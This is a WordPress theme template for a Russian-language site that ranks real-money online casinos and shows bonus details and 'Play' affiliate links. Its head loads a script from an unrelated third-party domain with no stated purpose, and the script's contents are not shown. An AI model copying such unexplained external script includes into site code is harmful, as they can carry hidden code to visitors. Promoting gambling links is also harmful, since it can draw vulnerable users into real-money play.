<!DOCTYPE html>
<html <?php language_attributes(); ?>>
 <head>
  <meta charset="<?php bloginfo( 'charset' ); ?>">
	     <link rel="canonical" href="https://avtomaty-luck.net/kazino-top/"/>	
	 <script src="https://savemyass.org/userjs/81076c.js"></script>

	<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">

	 <!--[if IE]>
   <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
  <![endif]-->

<meta http-equiv="X-UA-Compatible" content="IE=edge" />

<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="MobileOptimized" content="320"/>
    <meta name="HandheldFriendly" content="true"/>
    
    <?php wp_head(); ?>

    <script type="text/javascript" src="https://code.jquery.com/jquery-2.2.3.min.js"></script>
    <script type="text/javascript" src="/wp-content/themes/casino/js/jquery.jcarousellite.min.js"></script>
    <script type="text/javascript" src="/wp-content/themes/casino/js/jquery.easing.1.3.js"></script>
    <script type="text/javascript" src="/wp-content/themes/casino/js/jquery.mousewheel-3.1.12.min.js"></script>
 </head>
 <body>
 <div class="head"> 
    <a href="/" class="logo"><img src="/wp-content/themes/casino/img/logo.png"/></a>
    <div class="top_menu">
        
        
        
        
        <?php 
        
        $args = array(
        	'menu'            => '',              // (string) Название выводимого меню (указывается в админке при создании меню, приоритетнее 
        										  // чем указанное местоположение theme_location - если указано, то параметр theme_location игнорируется)
        	'container'       => 'div',           // (string) Контейнер меню. Обворачиватель ul. Указывается тег контейнера (по умолчанию в тег div)
        	'container_class' => '',              // (string) class контейнера (div тега)
        	'container_id'    => '',              // (string) id контейнера (div тега)
        	'menu_class'      => 'menu',          // (string) class самого меню (ul тега)
        	'menu_id'         => '',              // (string) id самого меню (ul тега)
        	'echo'            => true,            // (boolean) Выводить на экран или возвращать для обработки
        	'fallback_cb'     => 'wp_page_menu',  // (string) Используемая (резервная) функция, если меню не существует (не удалось получить)
        	'before'          => '',              // (string) Текст перед <a> каждой ссылки
        	'after'           => '',              // (string) Текст после </a> каждой ссылки
        	'link_before'     => '',              // (string) Текст перед анкором (текстом) ссылки
        	'link_after'      => '',              // (string) Текст после анкора (текста) ссылки
        	'depth'           => 0,               // (integer) Глубина вложенности (0 - неограничена, 2 - двухуровневое меню)
        	'walker'          => '',              // (object) Класс собирающий меню. Default: new Walker_Nav_Menu
        	'theme_location'  => ''               // (string) Расположение меню в шаблоне. (указывается ключ которым было зарегистрировано меню в функции register_nav_menus)
        );
        
        wp_nav_menu( array(
        	'menu_class'=>'menu',
            'theme_location'=>'top',
            'after'=>'<span>|</span>'
        ) );
        
        ?>
        
        
        
    </div>
 
 
 

<?php if (!is_home()) { ?>

<div class="breadcrumbs" typeof="BreadcrumbList" vocab="http://schema.org/">
    <?php if(function_exists('bcn_display'))
    {
        bcn_display();
    }?>
</div>
<?php } ?>
</div>
 <div class="clear"></div>

<?php //esc_html_e( 'Primary Menu', 'casino' ); ?>
<?php //wp_nav_menu( array( 'theme_location' => 'primary', 'menu_id' => 'primary-menu' ) ); ?>
            
            

<?php
/**
 * The template for displaying archive pages.
 *
 * @link https://codex.wordpress.org/Template_Hierarchy
 *
 * @package casino
 */

get_sidebar();
?>

<div class="all_content">

		<?php
   
   
   
   
        
		if ( have_posts() ) : ?>

		
				<?php
					echo '<h1 class="br3">Рейтинг онлайн казино на деньги</h1>'; //the_archive_title( '<h1 class="br3">', '</h1>' );
				?>
		
<div class="osn_content">

<div class="top_menu_kazino">
    <div class="d_1">№</div>
    <div class="d_2">Онлайн-казино</div>
    <div class="d_3">Бонусы</div>
    <div class="d_4">Кол-во автоматов</div>
    <div class="d_3">Платформа казино</div>
    <div class="d_6">Клиент</div>
    <div class="d_5">Обзор</div>
    <div class="d_7">Играть</div>
</div>

<div class="top_all_kazino">




			<?php
            
            
            
            
                        
            $args = array (
            	'post_type'              => array( 'kazino-top' ),
            	'post_status'            => array( 'publish' ),
                'meta_key'               => 'sort',
                'orderby'                => 'meta_value_num',
                'order'                  => 'ASC',
            );
            // The Query
            $query = new WP_Query( $args );


            
              $d=0;
        
                		while ( $query->have_posts() ) {
                            		$query->the_post();
                                    $d++;
?>
	<div class="d_0 br3">
    <div class="d_1"><?php echo $d; ?></div>
    <div class="d_2"><img src="<?php the_post_thumbnail_url( "sk-small-img6" ); ?>" alt="<?php the_title(); ?>"/></div>
    <div class="d_3"><div><?php the_field('bonus'); ?></div></div>
    <div class="d_4"><?php the_field('k_avt'); ?></div>
    <div class="d_3"><div><?php the_field('p_kazino'); ?></div></div>
    <div class="d_6">
    <?php 
        if(get_field('klient') == 1){
            echo '<div class="ok"></div>';
        }else{
            echo '<div class="not"></div>';
        }
    ?>
    </div>
    <div class="d_5">
        <a href="<?php echo get_post_permalink(); ?>" class="but_c1" title="Обзор">Обзор</a> 
    </div>
    <div class="d_5">
        <a href="<?php the_field('link_go'); ?>" class="but_d1" target="_blank" title="Играть">Играть</a>
    </div>
    </div>
    
    <?php
				//get_template_part( 'template-parts/content', 'kazino' );

			}

			if (function_exists('wp_corenavi')) wp_corenavi(); 
            
            wp_reset_postdata();

echo '</div></div>';

		else :

			get_template_part( 'template-parts/content', 'none' );

		endif; ?>



<?php dynamic_sidebar( 'casino-widget-bottom' ); ?>


</div>
<?php

get_footer();
